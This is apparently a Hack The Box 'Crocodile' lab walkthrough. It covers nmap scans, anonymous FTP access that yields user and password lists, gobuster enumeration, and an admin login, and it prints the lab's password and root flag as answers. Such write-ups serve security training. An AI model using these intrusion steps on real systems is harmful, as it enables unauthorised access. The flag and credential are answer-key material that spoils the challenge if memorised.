# Crocodile

> What nmap scanning switch employs the use of default scripts during a scan? 

#### -sC

---

> What service version is found to be running on port 21? 

```console
~$ nmap -sV -p 21 10.129.71.16
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-12 20:44 CET
Nmap scan report for 10.129.71.16
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```

#### vsftpd 3.0.3

---

> What FTP code is returned to us for the "Anonymous FTP login allowed" message?

```console
$ ftp 10.129.71.16
Connected to 10.129.71.16.
220 (vsFTPd 3.0.3)
Name (10.129.71.16:marco): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

#### 230

---

> What command can we use to download the files we find on the FTP server? 

```console
ftp> pass
Passive mode on.
ftp> dir
227 Entering Passive Mode (10,129,71,16,166,118).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08 10:58 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
227 Entering Passive Mode (10,129,71,16,191,166).
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
226 Transfer complete.
33 bytes received in 0.11 secs (0.2918 kB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
227 Entering Passive Mode (10,129,71,16,166,173).
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
226 Transfer complete.
62 bytes received in 0.11 secs (0.5571 kB/s)
ftp> quit
221 Goodbye.
```

#### get

---

> What is one of the higher-privilege sounding usernames in the list we retrieved? 

```console
$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
```

#### admin

---

> What version of Apache HTTP Server is running on the target host? 

```console
$ nmap -sV -p 80 10.129.71.16
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-12 20:53 CET
Nmap scan report for 10.129.71.16
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

#### 2.4.41

---

> What is the name of a handy web site analysis plug-in we can install in our browser? 

#### Wappalyzer

---

> What switch can we use with gobuster to specify we are looking for specific filetypes? 

#### -x

---

> What file have we found that can provide us a foothold on the target?

```console
$ gobuster -x php -u 10.129.71.16 -w /home/marco/Files/common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.129.71.16/
[+] Threads      : 10
[+] Wordlist     : /home/marco/Files/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2021/11/12 21:01:50 Starting gobuster
=====================================================
/assets (Status: 301)
/config.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/login.php (Status: 200)
```

#### login.php

---

> Submit root flag 

We can login with `admin` and as password the one taken from the `allowed.userlist.passwd` file `rKXM59ESxesUFHAd`

![](1.png)

#### HTB{c7110277ac44d78b6a9fff2232434d16}